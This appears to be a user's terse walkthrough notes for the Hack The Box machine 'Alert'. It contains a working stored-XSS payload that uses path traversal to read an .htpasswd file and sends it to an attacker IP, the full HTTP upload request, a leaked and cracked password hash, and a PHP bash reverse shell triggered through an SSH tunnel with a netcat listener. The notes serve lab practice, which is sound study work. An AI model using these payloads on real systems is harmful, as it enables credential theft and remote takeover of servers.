

<script>

fetch("http://alert.htb/messages.php?file=../../../../var/www/statistics.alert.htb/.htpasswd")

  .then(response => response.text())

  .then(data => {

    fetch("http://10.10.15.37:8000/?file_content=" + encodeURIComponent(data));

  });

</script>

this payload we add into our post request 
`POST /visualizer.php HTTP/1.1`
`Host: alert.htb`
`Content-Length: 422`
`Cache-Control: max-age=0`
`Accept-Language: en-US,en;q=0.9`
`Origin: http://alert.htb`
`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMxIOET2mw9LeUxCd`
`Upgrade-Insecure-Requests: 1`
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36`
`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7`
`Referer: http://alert.htb/index.php?page=alert`
`Accept-Encoding: gzip, deflate, br`
`Connection: keep-alive`

`------WebKitFormBoundaryMxIOET2mw9LeUxCd`
`Content-Disposition: form-data; name="file"; filename="shell.php.md"`
`Content-Type: text/markdown`
`<script>`
`fetch("http://alert.htb/messages.php?file=../../../../var/www/statistics.alert.htb/.htpasswd")`
  `.then(response => response.text())`
  `.then(data => {`
    `fetch("http://10.10.15.37:8000/?file_content=" + encodeURIComponent(data));`
  `});`
`</script>`
`------WebKitFormBoundaryMxIOET2mw9LeUxCd--`

then we past link that we get from response
![[Pasted image 20250124193516.png]]
and past this into contact us page, befor this we need to start our server php or python no matter
then
we take our .htpasswd content 
![[Pasted image 20250124204639.png]]
%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A
decoded:
<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
</pre>

this was cracked with hashcat:
manchesterunited - password for albert

after connecting to the alber in ssh  we found this
![[Pasted image 20250124211723.png]]
/opt/website-monitor/config

then we found active port on localhost, where working our monitoring
![[Pasted image 20250124220345.png]]

we create file in config dir shell.php
<?php exec("bash -c 'bash -i >& /dev/tcp/10.10.15.37/4444 0>&1'"); ?>

then we listening this port from our host
ssh -L 1234:localhost:8080 albert@10.10.11.44
in second terminal use nc
nc -lvnp 4444

open in browser http://localhost:1234/config/shell.php
